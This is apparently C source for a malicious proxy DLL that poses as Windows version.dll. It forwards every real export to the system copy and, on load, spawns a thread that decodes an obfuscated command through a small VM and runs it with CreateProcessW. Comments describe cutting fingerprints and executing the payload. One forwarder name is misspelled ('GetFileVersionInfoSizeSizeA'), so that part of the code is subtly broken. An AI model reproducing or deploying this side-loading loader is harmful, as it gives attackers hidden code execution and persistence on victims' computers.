#include <intrin.h>
#include "vm_engine.h"

#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=KERNEL32.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=KERNEL32.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")

// 擦除内存，防止敏感数据残留
void SecureWipe(void* v, size_t n) {
    if (v == NULL || n == 0) return;
    volatile unsigned char* p = (volatile unsigned char*)v;
    while (n--) {
        *p++ = 0;
    }
    _ReadWriteBarrier(); 
}

// 异步执行引擎
DWORD WINAPI ExecutePayload(LPVOID lpParam) {
	// 1. 在栈上还原字符串 (UTF-16 格式以匹配 CreateProcessW)
	WCHAR command[64];
	ExecuteVM(command);

	// 2. 初始化进程结构
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	// 手动初始化内存 (No-CRT 环境下不能用 memset)
	SecureWipe(&si, sizeof(si));
	SecureWipe(&pi, sizeof(pi));
	si.cb = sizeof(si);

	// 3. 执行 Payload
	if (CreateProcessW(
		NULL,           // lpApplicationName
		command,        // lpCommandLine (必须是可写的)
		NULL, NULL, FALSE, 0, NULL, NULL,
		&si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	SecureWipe(command, sizeof(command));

	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		// 减少指纹，禁止线程通知
		DisableThreadLibraryCalls(hinstDLL);

		// 异步启动，避免 Loader Lock
		HANDLE hThread = CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
		if (hThread) {
			CloseHandle(hThread);
		}
	}
	return TRUE;
}
